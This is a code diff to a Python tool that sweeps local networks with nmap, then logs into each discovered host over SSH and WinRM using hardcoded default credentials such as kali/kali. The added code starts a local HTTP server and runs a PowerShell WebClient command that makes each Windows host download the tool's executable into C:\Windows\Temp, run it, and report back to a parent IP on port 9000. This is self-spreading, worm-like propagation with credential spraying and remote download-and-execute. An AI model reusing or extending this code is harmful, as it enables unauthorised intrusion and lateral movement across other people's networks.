@@ -1,4 +1,3 @@
-from ast import excepthandler
 import base64
 import argparse
 import pickle
@@ -13,13 +12,15 @@ from scp import SCPClient
 from winrmcp import Client as WinClient
 from pypsexec.client import Client as ps_client
 import winrm
+from http.server import test, SimpleHTTPRequestHandler
+
 # TODO: Remove unneeded imports
 BIND_PORT = 9000
 BIND_ADDR = ('0.0.0.0', BIND_PORT)
+local_ips = []
 # List of new hosts found on the scan
 new_hosts = {}
 my_data = {}
-
 creds = []
 creds.append({'user': 'yos', 'pass': 'bos'})
 creds.append({'user': 'kali', 'pass': 'kali'})
@@ -37,7 +38,7 @@ class Host:
 
 def get_args():  # TODO: Verify this is positional and must + have help
     # Getting args: sm_ip, sm_port
-    global options
+    global options, debug
     parser = argparse.ArgumentParser()
     parser.add_argument('parent_ip', type=str, nargs='+',
                         help='Parent ip address')
@@ -47,8 +48,10 @@ def get_args():  # TODO: Verify this is positional and must + have help
                         action='store_true',
                         help='relay data back to parent',
                         )
-    options = parser.parse_args()
-    #options = parser.parse_args(['192.168.2.5', '127.0.0.1', '9000'])
+    if not debug:
+        options = parser.parse_args(['192.168.2.5', '127.0.0.1', '9000'])
+    else:
+        options = parser.parse_args()
 
     # Quit the program if the argument is missing
     if not options.parent_ip or not options.parent_port:
@@ -281,21 +284,21 @@ class RemoteLogin():
         return status
 
     def ssh(self):
-        global father_ip
+        global father_ip, options
         curr_file_location = "networkscanner"
         remote_file_location = "networkscanner"
 
         ssh_session = paramiko.SSHClient()
         ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         logged_in = False
-        for cred in creds:
+        for cred in creds: #TODO: Verify
             if not father_ip:
-                if type(options.parent_ip) == list:
-                    ip = ' '.join(options.parent_ip)
+                if type(local_ips) == list:
+                    ip = ' '.join(local_ips)
                 else:
-                    ip = options.parent_ip
+                    ip = local_ips
             else:
-                ip = father_ip
+                    ip = father_ip
 
             scanner_exec_command = "echo " + \
                 cred['pass'] + " | sudo -S ./" + \
@@ -330,23 +333,45 @@ class RemoteLogin():
             return True
 # 5985
 
+    def startHttpServer(self):
+        print('in')
+        test(SimpleHTTPRequestHandler)
+
+
+
     def windows_winrm(self):
+        global local_ips, father_ip, options
         # try:
         scanner_path = "networkscanner.exe"
         for cred in creds:
             try:
                 s = winrm.Session(self.server,
                                   auth=(cred['user'], cred['pass']))
-                util = WinRMUtil(s)
-                util.upload_file(scanner_path,
-                                 scanner_path)
-                r = s.run_cmd('tar -xf ' + scanner_path,)
-                r = s.run_cmd('cd networkscanner.dist')
-                r = s.run_cmd('networkscanner.exe')
-                print(r.std_out)
+                # util = WinRMUtil(s)
+                # util.upload_file(scanner_path,
+                #                  scanner_path)
+                r = s.run_cmd('echo a')
+                http_th = threading.Thread(target=self.startHttpServer)
+                http_th.start()
+                time.sleep(10)
+                for ip in local_ips:
+                    r = s.run_cmd("Powershell -c \"& {(New-Object System.Net.WebClient).DownloadFile(\'http://" +ip+":8000/networkscanner.exe\', \'C:\\Windows\\Temp\\networkscanner.exe\')}\"")
+                    print(f'out: {r.std_out}, error: {r.std_err}')
+                    time.sleep(1)
+
+                if not father_ip:
+                    if type(local_ips) == list:
+                        ip = ' '.join(local_ips)
+                    else:
+                        ip = local_ips
+                else:
+                    ip = father_ip
+                r = s.run_cmd('C:\\Windows\\Temp\\networkscanner.exe -r ' + ip + ' 9000')
+                print(f'out: {r.std_out}, error: {r.std_err}')
                 # client = WinClient(self.server, auth=(
                 #     cred['user'], cred['pass']))
-                # client.copy(scanner_path, scanner_path)
+                # client.copy(scanner_path, '%TEMP%\\'+scanner_path)
+                # print(ok)
                 # c = ps_client(self.server, username=cred,
                 #               password=creds[cred])
                 # c.connect()
@@ -354,7 +379,6 @@ class RemoteLogin():
                 #                                       arguments="python3 "+scanner_path)
                 # c.remove_service()
                 # c.disconnect()
-
                 return True
             except requests.exceptions.ConnectionError as err:
                 print(err)
@@ -380,52 +404,38 @@ def get_local_ips():
     print(local_ips)
     return local_ips
 
-
 def main():
-    global new_hosts
+    global new_hosts, local_ips, debug
     debug = False
+    local_ips = get_local_ips()
+    args = get_args()
     if not debug:
-        args = get_args()
         communicator = Communicator(args.parent_ip, args.parent_port)
         if args.relay:
-            communicator.init_relay()  # TODO: decide if used by args
+            communicator.init_relay()
         nmap_scanner = NmapScanner()
         # Start scanning
-        local_ips = get_local_ips()
         my_data['ips'] = local_ips
         for ip in local_ips:
             # TODO: in new thread
             hosts = nmap_scanner.arp_pingsweep(ip)
             # nmap_scanner.os_detection(hosts)
-
-            # OPTIONAL: add information gathering commands
-
-        # TODO: after threads -  Wait for all threads to finish
     if debug:
-        new_hosts = {'192.168.1.60': Host(
-            '192.168.1.60')}
+        new_hosts = {'192.168.1.46': Host(
+            '192.168.1.46')}
         print('debug hosts')
-    # new_hosts = {}
-    # Send results back
 
+    # Send results back
     my_data['hosts'] = new_hosts
     if not debug:
         communicator.send_results(my_data)
-    #threads = []
     for host in new_hosts:
         print(host)
         if new_hosts[host].os:
             remote = RemoteLogin(host, new_hosts[host].os)
         else:
             remote = RemoteLogin(host)
+        #remote.scan_host()
         th = threading.Thread(target=remote.scan_host)
         th.start()
-        # threads.append(th)
-        # remote.scan_host()
-
-    # time.sleep(3)
-    # for th in threads:
-    #     th.join()
-
-
 main()
